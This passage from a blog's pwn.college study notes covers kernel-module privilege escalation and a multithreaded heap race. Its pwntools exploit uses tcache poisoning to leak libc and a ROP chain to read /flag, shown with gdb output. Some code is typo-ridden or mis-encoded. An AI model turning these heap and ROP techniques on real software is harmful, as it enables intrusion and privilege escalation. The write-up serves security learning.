class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;...&quot;</span>;<br><span class="hljs-keyword">int</span> len = <span class="hljs-number">264</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">256</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">memcpy</span>(test.buf, shellcode, <span class="hljs-number">256</span>);<br>    test.addr = (<span class="hljs-keyword">void</span>*)...;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, &amp;test, <span class="hljs-number">264</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="level10-5"><a href="#level10-5" class="headerlink" title="level10"></a>level10</h4><p>I cannot figure out the difference between this and previous levelâ€¦..</p><h4 id="level11-5"><a href="#level11-5" class="headerlink" title="level11"></a>level11</h4><p>have user land program with seccomp constraint(write). </p><p>and the pwncollege proc <strong>cannt be read</strong> by user:hacker. we can use write to do privilege escalation.</p><h4 id="level12-3"><a href="#level12-3" class="headerlink" title="level12"></a>level12</h4><p>first fork a child to read the flag into bss segment, then delete the flag.<br>Next read shellcode which can only use write syscall.<br>the shellcode use write() to communicate with pwncollege kernel module for privilege escalation purpose.<br>then use write() to print out the bss segment content.</p><h1 id="module-E-advance"><a href="#module-E-advance" class="headerlink" title="module E-advance"></a>module E-advance</h1><h4 id="key-point-1"><a href="#key-point-1" class="headerlink" title="key point:"></a>key point:</h4><ul><li>Core concept: security checks that do not properly use mutexes are ineffective in a multithreaded environment!</li><li>keeps track of what do you know about the process and the program, what do you need to know, what you can do.</li><li><strong>Problem:</strong> we lack knowledge of:<ul><li>PIE base (binary address)</li><li>ASLR base (library addresses)</li><li>Stack base</li><li>Heap base</li><li>Canary</li></ul></li><li>may be a plan:<ol><li>Leak address of tcache_perthread_struct.</li><li>Compute address of pointer to main_arena.</li><li>Leak address of main_arena in libcâ€™s BSS.</li><li> Compute libc base address.</li><li>Compute a thread stack address.</li><li>Leak the canary and overflow the stack or Overwrite the return address with a ropchain!</li></ol></li><li>first: heap base, via tcache poisoning.<ul><li>use race condition showed in the vedio, interleave <code>free</code> with <code>write</code>.</li></ul></li><li>When previous work is done, we get one address in per thread tcache memory. then by gdb it we can find the main_areana pointer in the same memory region. Then we have all threads <strong>heap metadata+libc base address</strong>.</li><li>Exploit Primitives:<ul><li>the building block of complex exploitation:<br>arbitrary read, arbitrary write, arbitrary call. or controlled ones.</li><li>the slides demonstrate an exp example of multithread message storing service.</li><li>use wrapped code for reuse intention.</li><li>some gotchas: <ul><li>corrupted heap metadata: start a new connection</li><li>burned bridges(pointer to not a valid heap chunk): avoid newly non-viable code paths.</li></ul></li></ul></li><li>kernel race:<ul><li>syscalls, file access, interrupts can be triggered simultaneously.</li><li>prevention and recent situation in <a href="https://docs.google.com/presentation/d/16MN3BneO7l16SX_cpvTYlV25nfdRuqfRIRQvV-iURa0/edit#slide=id.gade02eaa21_0_5">SLIDES</a> </li></ul></li></ul><p><b style="color:red">Pivoting Around Memory</b> </p><ul><li>four major parts:<ul><li>The program itself</li><li>The stack</li><li>libc</li><li>The heap</li></ul></li><li>Stack from libc: <code>__libc_argv</code> or <code>environ</code> <ul><li>the <code>environ</code> variable is just a pointer to the env on stack set up by the _start() function(maybe).<br>and the setenv() funtion allocates a chunk on heap for the new string. this function also copies all env stringsâ€™ pointer(to stack) to the heap, and add new env pointer to the end of it.lsdfk</li><li>the <code>setenv()</code> copies the string, and the <code>putenv()</code> refers it.</li></ul></li><li>libc from binary: reading GOT entries</li><li>Program base from libc: pivoting through ld<ul><li>libc always contains pointers into <strong>ld</strong> for runtime symbol resolution (in the form of the <strong><code>_dl_runtime_resolve</code></strong> libc GOT entry)</li><li>ld is also practically guaranteed to be at a constant offset from libc</li><li><b>Either way, once the address of ld has been leaked, the <code>name</code> field of the global <code>_dl_rtld_libname</code> struct holds a pointer into the <code>.interp</code> section of the main binary</b> </li></ul></li></ul><img src="../../image/pwn-modules/image-20220621212230967.png" alt="image-20220621212230967" style="zoom:80%;" /><p>e.g.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork() =<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>            <span class="hljs-comment">#è¿™ä¸ªAAABBBä¹Ÿæ˜¯ç»†èŠ‚, è®©æˆ‘çº ç»“åˆ°åŠå¤œä¸€ç‚¹å¤šçš„ç½ªé­ç¥¸é¦–.</span><br>            r1.sendline(<span class="hljs-string">&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0&quot;</span>)<br>        os.kill(os.getpid()ï¼Œ<span class="hljs-number">9</span>)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>        r2.sendline(<span class="hljs-string">&quot;printf 0&quot;</span>)<br>    os.wait()<br>    output = r2.clean()<br>    r1.clean()<br>    leak = pwn.u64(<span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>ï¼Œ<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br>idx = <span class="hljs-number">1</span><br><span class="hljs-comment">#just as the name, malloc a chunk at the specific address.</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    r1.clean()<br>    r2.clean()<br>    <br>    packed =pwn.p64(addr)<br>    r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&quot;free <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>            os.kill(os.getpid(),<span class="hljs-number">9</span>)<br>r2.send((<span class="hljs-string">b&quot;scanf %d &quot;</span>%idx + packed + <span class="hljs-string">b&quot;\n&quot;</span>)*<span class="hljs-number">2000</span>)<br>         os.wait()<br>         time.sleep(<span class="hljs-number">0.1</span>)<br>         <span class="hljs-comment">#use printf command to check whether the race is win(@packed == content printed out).</span><br>         r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx&#125;</span> printf <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>         r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>         stored = r1.readline()[:-<span class="hljs-number">1</span>]<br>         <span class="hljs-comment">#there maybe an \0 in the address code. if the condition is true, it means the race succeeds.</span><br><span class="hljs-keyword">if</span> stored == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>         <span class="hljs-keyword">break</span><br>r1.sendline(<span class="hljs-string">f&quot;malloc <span class="hljs-subst">&#123;idx+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>r1.clean()<br>idx += <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1,r2,addr</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>r1.sendline(<span class="hljs-string">f&quot;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    r1.readuntil(<span class="hljs-string">&quot;MESSAGE:&quot;</span>)<br>    output = r1.readline()[:-<span class="hljs-number">1</span>]<br>    leak = pwn.u64(output[:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>ï¼Œ <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">return</span> leak<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1,ï¼Œr2ï¼Œaddr , value</span>):</span><br>    controlled_allocation(r1,r2,addr)<br>    r1.send(<span class="hljs-string">b&quot;scanf %d &quot;</span>%(idx-<span class="hljs-number">1</span>) + value + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    p.kill()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br><br>p=pwn.process( <span class="hljs-string">&quot;./ult&quot;</span>)<br><span class="hljs-comment">#pwn.gdb.attach(p, &quot;continue\n&quot;)</span><br><span class="hljs-comment">#time.sleep(1)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/naps&quot;</span> ).read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r3 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CONPUTED: MAIN_ARENA_PTR: &quot;</span> , <span class="hljs-built_in">hex</span>(main_arena_ptr_address))<br>main_arena_address = arbitrary_read(r1ï¼Œr2, main_arena_ptr_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: MAIN_ARENA: &quot;</span>,<span class="hljs-built_in">hex</span>(nain_arena_address))<br>libc_base = main_arena_address - <span class="hljs-number">0x1ebb80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: LIBC_BASE: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#this is the return address of vuln in thread. thus the *stored* rip.</span><br>stored_rip_address = libc_base - <span class="hljs-number">0x4138</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: STORED_RIP_ADDRESS:&quot;</span>, <span class="hljs-built_in">hex</span>(stored_rip_address))<br>addr_in_binary = arbitrary_read(r1ï¼Œr2,stored_rip_address)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: ADDR IN BINARY:&quot;</span>, <span class="hljs-built_in">hex</span>(addr_in_binary))<br>bin_base = addr_in_binary - <span class="hljs-number">0x172f</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;COMPUTED: BINARY BASE: &quot;</span>, <span class="hljs-built_in">hex</span>(bin_base))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;!!!!!! LET&#x27;S ROLLING !!!!!!&quot;</span>)<br><span class="hljs-comment">#new technique</span><br>libc = p.elf.libc<br>libc.address = libc_base<br>pwn.context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\xoc\xod\xoe\x20&quot;</span>)<br>rop.call( <span class="hljs-string">&quot;close&quot;</span>,[<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>rop.call( <span class="hljs-string">&quot;read&quot;</span>ï¼Œ[<span class="hljs-number">0</span>,libc.bss(<span class="hljs-number">0x123</span>)ï¼Œ<span class="hljs-number">42</span>])<br>rop.call( <span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>)ï¼Œ<span class="hljs-number">0</span>])<br>rop.call( <span class="hljs-string">&quot;sendfile&quot;</span>ï¼Œ[<span class="hljs-number">1</span>ï¼Œ<span class="hljs-number">3</span>ï¼Œ<span class="hljs-number">0</span>ï¼Œ<span class="hljs-number">1024</span>])<br>rop.call( <span class="hljs-string">&quot;exit&quot;</span>,[<span class="hljs-number">42</span>])<br><br>arbitrary_write(r1ï¼Œr2ï¼Œstored_rip_address, rop.chain())<br>r1.sendline( <span class="hljs-string">&quot;quit&quot;</span>)<br>p.send( <span class="hljs-string">&quot;/flag\0&quot;</span>)<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;LEAKED:&quot;</span>, p.readall())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXITED: &quot;</span>, p.poll())<br></code></pre></div></td></tr></table></figure><p>finally, i come to the last module level.</p><h4 id="level1-4"><a href="#level1-4" class="headerlink" title="level1"></a><del>level1</del></h4><p>emmmmmm, i thought i have to write the script above by my own hand.</p><p>failed to test the above program in kali2021, maybe the source code of tache is changed.</p><p>Ohhhhhh, i forget the thread local var is in high address space, so the tcache contains â€˜\x7fâ€™.</p><p>we can get the constant offset of libc and thread tcache address(0x7f44ac0008d0):</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#print the content of the chunk.</span><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx <span class="hljs-number">0x7f44ac000f20</span><br><span class="hljs-number">0x7f44ac000f20</span>: <span class="hljs-number">0x00000007f44ac000</span>      <span class="hljs-number">0x00007f44ac0008d0</span><br><span class="hljs-number">0x7f44ac000f30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></div></td></tr></table></figure><img src="../../image/pwn-modules/image-20220603165348772.png" alt="image-20220603165348772" style="zoom:80%;" /><p>we can notice that the first 8 bytes of the chunk is 0x00007f44ac000, which is not a valid high layout address. because libc 2.33 uses a newer technique: PROTECT_PTR macro. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">   larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">   still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  <span class="hljs-comment">//and one line difference in tcache_put()!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>the server is using libc-2.31, which matches with ubuntu20.04. and this version doesnâ€™t have PROTECT_PTR macro.</p><p>the result on my kali2021 is:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#this is tcache next pointer(with padded address)</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x00000007f44ac000000</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7f44ac000000</span>     <span class="hljs-number">0x7f44ac021000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap <span class="hljs-number">3</span>:<span class="hljs-number">1</span>] +<span class="hljs-number">0x0</span><br><span class="hljs-meta">#this is tcache struct</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x00007f44ac0008d0</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7f44ac000000</span>     <span class="hljs-number">0x7f44ac021000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap <span class="hljs-number">3</span>:<span class="hljs-number">1</span>] +<span class="hljs-number">0x8d0</span><br></code></pre></div></td></tr></table></figure><p>we continue to check the content of address 0x00007f44ac0008d0 to look up for libc-based address, which is appeal to us.</p><blockquote><p>by <code>x/512gx 0x00007f44ac0008d0</code>, we can found the useful addresses in higher space than heap. just take one. and use the offset among known addresses to calc more addresses.</p></blockquote><p>Okay, the beginning of the heap stores some infomation containing a pointer to main_arena. so we should use <code>x/512gx 0x00007f44ac000000</code>, which is page-aligned version of previous one.</p><p>then we can find this:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">in founded address:<br><span class="hljs-comment">/*0x7f055c000880: 0x0000000000000000      0x0000000000000000*/</span>     <br># <span class="hljs-number">0x7f055c000890</span>: <span class="hljs-number">0x00007f0563ef5ba0</span>      <span class="hljs-number">0x0000000000000000</span>      <br><span class="hljs-comment">/*0x7f055c0008a0: 0x0000000000000001      0x0000000000021000*/</span><br><span class="hljs-keyword">and</span> in maps:<br><span class="hljs-comment">/*  0x7f0563d38000     0x7f0563d5e000 r--p    26000 0      /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563d5e000     0x7f0563ea6000 r-xp   148000 26000  /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563ea6000     0x7f0563ef1000 r--p    4b000 16e000 /usr/lib/x86_64-linux-gnu/libc-2.33.so</span><br><span class="hljs-comment">    0x7f0563ef1000     0x7f0563ef2000 ---p     1000 1b9000 /usr/lib/x86_64-linux-gnu/libc-2.33.so*/</span><br>#   <span class="hljs-number">0x7f0563ef2000</span>     <span class="hljs-number">0x7f0563ef5000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">1b</span>9000 /usr/lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.33</span>.so<br><span class="hljs-comment">/*  0x7f0563ef5000     0x7f0563ef8000 rw-p     3000 1bc000 /usr/lib/x86_64-linux-gnu/libc-2.33.so*/</span><br></code></pre></div></td></tr></table></figure><p>These two are perfectly matched. and now we find the main_arenaâ€™s address.</p><h4 id="level1-5"><a href="#level1-5" class="headerlink" title="level1"></a>level1</h4><p>the additional command is send_flag, which calls <code>load_secret()</code> and <code>strcmp()</code> to check whether the pwd is correct. the answer is a randomized string taking the flag as seed.  wont change between runnings. </p><p>in this level, the pwd is stored into bss segment in main function.</p><blockquote><p><strong>Thinking process:</strong> </p><p>we must leak the pwd through arbitrary read, and before the read we should also get the stack pointer of some stack frame.</p><p>and the secret_correctâ€™s stack frame base is a constant offset by libc base which is 0x4640 in my kali2021. the pwd is stored in <code>ebp-0x20</code>, and  the length is 16 bytes.</p><p>but secret_correct() has stack reuse protection: <code>memset(s2, 0, 0x11uLL)</code> to set pwd string to NULL.</p><p>emmmmâ€¦â€¦â€¦â€¦â€¦â€¦â€¦.. should i try a race to read pwd before he clears out the PWD s2? I think not. </p><p>I can <strong>change the return address</strong> of <code>challenge()</code> to <code>win()</code> after using quit command. by using the functionâ€™s ebp i can easily locate it.</p></blockquote><p>or, in this level, main function puts the pwd into 0x405655, where we can directly read out from.</p><blockquote><p>wtf, when i try to read the main_arean_addr, the value stored there begins with â€˜\x0aâ€™, which means â€˜\nâ€™ and will stop printf to print all the rest chars.<br><code>pwndbg&gt; x/8bx 0x00007fbc88000890</code><br><code>0x7fbc88000890: 0xa0    0x9b    0x1a    0x8f    0xbc    0x7f    0x00    0x00</code> </p><p>Okay, thatâ€™s beccause i use the recvline, it will stop at the carrige return.</p></blockquote><p>so we should use r1.clean() to receive message.</p><blockquote><p><strong>why would the printf print out the null bytes??????</strong> Im so confused. </p><p>ohhhh, i think i get the point. before the printf prints out a string, it will check the string length by locating the null byte. and then it will call the write syscall to prints out all bytes(such as null byte).  but in race condition, with previously filled AAAAAAAABBBBBBBB, after passing the length check, now printf is scheduled to free.  then the â€˜stringâ€™ is a tcache_perthread_ptr, the write syscall will directly prints it out.</p></blockquote><p><del>but we canâ€™t read the null byte in, nor the white characters</del>.<b style="color:red">we can scanf null bytes into the buffer. the scanf simply adds a \0 to the end of the string, without checking whether there are null bytes in it </b>. what a surprise.</p><p><strong>Again, i forgot the libc version on my kali is 2.33. stucked in why tcache poisoning donâ€™t work, neglected the PROTECT_PTR macro.</strong> </p><p>but i figure out that the chunk 0 is at a constant offset from the tcache_perthread_struct address, which is 0x650. the tcache link at the end of controlled_allocation is like this: <code>tcache_entry[i]-&gt;chunk_0-&gt;packed address</code> </p><img src="../../image/pwn-modules/image-20220619123546515.png" alt="image-20220619123546515" style="zoom:80%;" /><p>and what we all need is addr(@packed) and chunk0 addr(now we get it), and then perform calc like this: <code>(addr&gt;&gt;12)^packed</code>. </p><p>but the second time using arbitrary read it says: <code>malloc(): unaligned tcache chunk detected</code> , thatâ€™s because the target 0x405655 is not aligned with 16 bytes in x86-64 machine. however, using 0x405650 as string start address will encounter the problem that it starts with the null bytes.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> x/21bc 0x405650</span><br>0x405650 &lt;secret+80&gt;:   0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 0 &#x27;\0&#x27; 109 &#x27;m&#x27; 108 &#x27;l&#x27; 116 &#x27;t&#x27;<br>0x405658 &lt;secret+88&gt;:   122 &#x27;z&#x27; 102 &#x27;f&#x27; 118 &#x27;v&#x27; 114 &#x27;r&#x27; 102 &#x27;f&#x27; 113 &#x27;q&#x27; 103 &#x27;g&#x27; 106 &#x27;j&#x27;<br>0x405660 &lt;secret+96&gt;:   120 &#x27;x&#x27; 118 &#x27;v&#x27; 107 &#x27;k&#x27; 112 &#x27;p&#x27; 101 &#x27;e&#x27;<br></code></pre></div></td></tr></table></figure><p>so we could use arbitrary_write() to change address stored in message[2], and <del>only need to change the last byte</del>. scanf will read in null byte, so it needs full address to be packed.</p><p>finally, i use this plan(as follows). change the messageâ€™s content to another place where we want to overwrite. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 